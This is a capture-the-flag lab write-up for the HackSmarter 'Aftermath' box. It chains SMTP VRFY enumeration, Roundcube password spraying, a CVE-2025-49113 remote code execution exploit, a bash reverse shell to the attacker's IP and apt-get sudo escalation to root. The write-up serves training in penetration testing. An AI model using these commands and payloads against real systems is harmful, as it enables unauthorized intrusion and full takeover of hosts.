# HackSmarter — Aftermath Writeup

**Target:** `10.1.32.43`

**Attacker:** `10.200.94.4` (Parrot OS)

**Difficulty:** Easy

**Chain:** SMTP Enum → Roundcube RCE (CVE-2025-49113) → `www-data` → `apt-get` privesc → root

<img width="900" height="512" alt="e2da119c-5b00-438c-b561-db47aae459c6" src="https://github.com/user-attachments/assets/2499f3ec-ad49-49b7-a99b-2bab11c17ee7" />


---

##  Objective
```
You have been assigned a penetration test against a Linux server in the client's network. Your objective is to gain root access. The client has planted three flags on the system, retrieving each of these flags demonstrates impact.

Initial Access
Another team member pulled down a list of names and passwords from DeHashed... but are unsure if any of them are valid.

what we have :
names.txt and passwords.txt
```

---

## 🔎 1. Reconnaissance

### 1.1 Host Discovery

```
nmap -p- -sV -sC -T4 10.1.32.43 -oN full_scan.txt
```

**Results:**

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a4:f0:03:80:46:18:04:53:47:2e:bf:8d:c1:9e:66:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMgbbaMyJEYXgh7IT0kwHZ4vF+bNfXi/Qo6kzc+wldKmAOfdHNrt5kZd5lG51lsL975V0F4R7RVzHDVFJEZeWQk=
|   256 ed:38:36:53:81:bf:c3:15:a2:22:d8:cc:49:3c:63:3d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPxf4Ttxig7FRpqQuFy9yStc+ajfdz52dxXC3rUwH2dL
25/tcp open  smtp    syn-ack Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=kali
| Subject Alternative Name: DNS:kali
| Issuer: commonName=kali
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-02T19:39:52
| Not valid after:  2036-02-28T19:39:52
| MD5:   25b2:9a20:c5a5:6087:df8f:476e:b232:39c9
| SHA-1: 3452:1e8f:0af2:ce28:ca99:2a19:2dee:54dc:b5aa:a673
| -----BEGIN CERTIFICATE-----
| MIIC6TCCAdGgAwIBAgIUeaW7QnviaqxGa5HvkjnVU+GhQ9IwDQYJKoZIhvcNAQEL
| BQAwDzENMAsGA1UEAwwEa2FsaTAeFw0yNjAzMDIxOTM5NTJaFw0zNjAyMjgxOTM5
| NTJaMA8xDTALBgNVBAMMBGthbGkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCrVQbb6jV/ft5z1U6pFdKJutmgAX1YJeASr5z0ilBFDiRSTgugKAvcmyCt
| uzE0RY6Gzd4xwuZvh3ltmoXKBq11WnD2U5pYQENaPEPeJ7oFfT9+Uad780rXrmR7
| fhNtpDrZjSoshA06uF4xDgI5p2HcWCD5hINmfqbjzq1OBEtW8G3MvZd/snmGOn2v
| QpZ9uj1tUyRT55VvRohdDS+K7szLcrs9iRpqog77+N4aIC8tCZxi1h2oar+GHJR+
| r6N3J85XVyOUzZPPcRdNBtbUuGEedQxGrDY4ZAuSKawWJVOG+1V3uBA1bRAjdJJl
| w6aUpoxkuAAiwkdaSXmzRggkYMKLAgMBAAGjPTA7MAkGA1UdEwQCMAAwDwYDVR0R
| BAgwBoIEa2FsaTAdBgNVHQ4EFgQUBhinmATeQCMbrSPjOEO54MeSTwQwDQYJKoZI
| hvcNAQELBQADggEBAJ+zdoifzuC1RIQGsY3xvQVRzS4FwTQ4IHiyfULomrTVCNoB
| +Lwc0OjBGRZqPdMo/Defbb7x/eSV4X2WXC3b15jhpkY++Y7BXq6In3SKpiAPySCW
| k1bYokHYNb19xjLEZPEjeXGB2zm+ikjOZ2pAufdIfqFFU1vqwlf9b/WEm5g6/p+t
| KZF9k99LMjXo1SYCnlZXiowI6XrEIN2sBZaYcRCeIGa1pHgBxc+WQ2S5Xiy8JPtQ
| cFAFpi/I0cnLsYsF8C0CG5xCWRddbpz6pX0vdujUvF5KGTyCycTPEWtVFbrWi4I3
| bapnWexZWBnOeKdfmSWNgFSQ+/AXhp0vD+SjUqg=
|_-----END CERTIFICATE-----
|_smtp-commands: kali, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
Service Info: Host:  kali; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 12 09:18:39 2026 -- 1 IP address (1 host up) scanned in 13.30 seconds

```

### 1.2 Key Observations

| Finding | Significance |
|---|---|
| Port 22 open — OpenSSH 8.9p1 | Password auth later found **disabled** (publickey only) |
| Port 25 open — Postfix | **No `AUTH` advertised** → SMTP auth disabled |
| `VRFY` in `smtp-commands` | ✅ User enumeration possible |
| `ETRN` enabled | Unusual; noted but not exploited |
| Cert CN = `kali` | Box hostname = `kali` |
| HTTP on port 80 | Roundcube webmail front-end at `/roundcube` |

### 1.3 Rules Out Early (Important Negative Results)

- **Open relay:** `RCPT TO:<external@domain>` returned `454 4.7.1 Relay access denied` → no relay.
- **SMTP AUTH:** `AUTH LOGIN` returned `503 5.5.1 Error: authentication not enabled` → brute-forcing SMTP auth is a dead end.
- **SSH password auth:** `hydra` returned `target does not support password authentication (method reply 4)` → password brute-force is a dead end.

These negative results saved significant time and forced the correct pivot to the web service.

---

## 📬 2. SMTP User Enumeration

Postfix was configured with `VRFY` enabled, allowing unauthenticated username discovery.

### 2.1 Manual Verification

```bash
nc 10.1.32.43 25
```

```
220 kali ESMTP Postfix (Ubuntu)
VRFY kali
252 2.0.0 kali
VRFY maria
252 2.0.0 maria
VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
```

`252` responses confirm valid users; `550` confirms invalid ones.

### 2.2 Automated Enumeration

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.1.32.43
```

**Result:**

```
kali   exists
maria  exists
```

Two users recovered: **`kali`** and **`maria`**.

### 2.3 Login to RoundCube Portals

Confirming `maria:$PASSWORD` is a real valid mailbox account using a script to do password sprying `https://github.com/robotshell/cubeSpraying`:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Aftermath/cubeSpraying]─[10.200.94.4]
└──╼ $ python3 cubeSpraying.py -u http://10.1.32.43/roundcube/ -U maria -P ../passwords.txt  -v
Trying maria:123456 - HTTP Status Code: 401
Trying maria:12345678 - HTTP Status Code: 401
Trying maria:qwerty - HTTP Status Code: 401
Trying maria:abc123 - HTTP Status Code: 401
Trying maria:monkey965 - HTTP Status Code: 401
Trying maria:1234567 - HTTP Status Code: 401
Timeout while trying to log in for maria.
Trying maria:trustno1 - HTTP Status Code: 401
Trying maria:dragonbALL - HTTP Status Code: 401
Trying maria:12345 - HTTP Status Code: 401
Timeout while trying to log in for maria.
Trying maria:Admninistrator - HTTP Status Code: 401
Trying maria:love123 - HTTP Status Code: 401
Trying maria:hello - HTTP Status Code: 401
Timeout while trying to log in for maria.
Trying maria:Summer - HTTP Status Code: 401
Trying maria:flower - HTTP Status Code: 401
Trying maria:1qaz2wsx - HTTP Status Code: 302
*************************************************
[SUCCESS] Valid credentials found: maria:$PASSWORD
*************************************************


```

---

## 🌐 3. Roundcube — CVE-2025-49113 (Authenticated RCE)

### 3.1 Discovery
using this credentials to authenticate to `http://10.1.32.43/roundcube`.
allows us to discover the version of Roundcube,

<img width="900" height="486" alt="image" src="https://github.com/user-attachments/assets/f452cdc5-3eae-485f-ac6f-6b40eb4787c2" />


### 3.2 Vulnerability

**CVE-2025-49113** — post-authentication PHP object injection in Roundcube's `Crypt_GPG_Engine` class. A crafted `_gpgconf` property is deserialized and passed to `sh`, allowing command execution.

**Affected versions:** 1.5.x < 1.5.10, 1.6.x < 1.6.11.

Version confirmed in the Roundcube about page:

```
Roundcube Webmail 1.5.9

```

### 3.3 Credential Source

The credentials for Roundcube come from the mail side — one of the enumerated users `maria` with a password recovered from the SMTP enumeration stage.

### 3.4 Exploit `https://github.com/Zwique/CVE-2025-49113`

```
python3 CVE-2025-49113.py http://10.1.32.43/roundcube kali '<password>' 'id'
```

**Output:**

```
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10605
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

A timing test (`sleep 5`) confirmed code execution.

### 3.5 Reverse Shell

```
# Attacker penelope listener
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```

```
python3 CVE-2025-49113.py http://10.1.32.43/roundcube kali '<password>' \
  "bash -c 'bash -i >& /dev/tcp/10.200.94.4/443 0>&1'"
```

**Shell as `www-data`:**

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Aftermath/CVE-2025-49113]─[10.200.94.4]
└──╼ $ wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 10.31.237.126 • 10.200.94.4
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => kali 10.1.32.43 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/donmed/.penelope/sessions/kali~10.1.32.43-Linux-x86_64/2026_09_12-10_54_06-625-www-data_33.log
──────────────────────────────────────────────────────────────────────────────
www-data@kali:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@kali:/$ 
```

---

## ⬆️ 4. Privilege Escalation — `apt-get` (GTFOBins)

### 4.1 Enumerate Sudo Rights

```bash
sudo -l
```

**Output:**

```
www-data@kali:/bin$ sudo -l
Matching Defaults entries for www-data on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on kali:
    (ALL) NOPASSWD: /usr/bin/apt-get

```

### 4.2 Exploit

`apt-get` allows arbitrary pre-hook execution via `APT::Update::Pre-Invoke`. Because it runs as root through `sudo`, `/bin/sh` inherits root privileges.

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

**Root shell:**

```
www-data@kali:/bin$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```

### 4.3 Capture Flags

```
cat /root/root.txt
cat /usr/user.txt

```

---

## 🧭 Attack Chain Diagram

```
[nmap] 22/ssh (publickey only)  25/smtp (no auth, no relay, VRFY on)
           │
           ▼
   VRFY → kali, maria (user enum)
           │
           ▼
   Roundcube @ :80/roundcube (v1.6.5)  ← CVE-2025-49113
           │
           ▼
   www-data shell via PHP object injection
           │
           ▼
   sudo -l → apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
           │
           ▼
          root
```

---

## 🛠️ Tooling Reference

| Stage | Tool | Command |
|---|---|---|
| Port scan | nmap | `nmap -p- -sV -sC -T4 <IP>` |
| SMTP enum | smtp-user-enum | `smtp-user-enum -M VRFY -U names.txt -t <IP>` |
| SMTP validate | cubeSpraying | `python3 cubeSpraying.py -u http://10.1.32.43/roundcube/ -U maria -P ../passwords.txt  -v` |
| RCE | CVE-2025-49113.py | `python3 CVE-2025-49113.py <url> maria <pass> <cmd>` |
| Privesc | sudo apt-get | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |

---

## 📚 References

- CVE-2025-49113 — Roundcube PHP object injection (authenticated RCE) `https://github.com/Zwique/CVE-2025-49113`
- GTFOBins — `apt-get`: https://gtfobins.github.io/gtfobins/apt-get/
- Postfix configuration hardening — `disable_vrfy_command`, `smtpd_relay_restrictions`
- RFC 5321 — SMTP `VRFY` and `ETRN`

---

*Writeup for the HackSmarter "Aftermath" lab. Tested only within the authorized lab environment.*
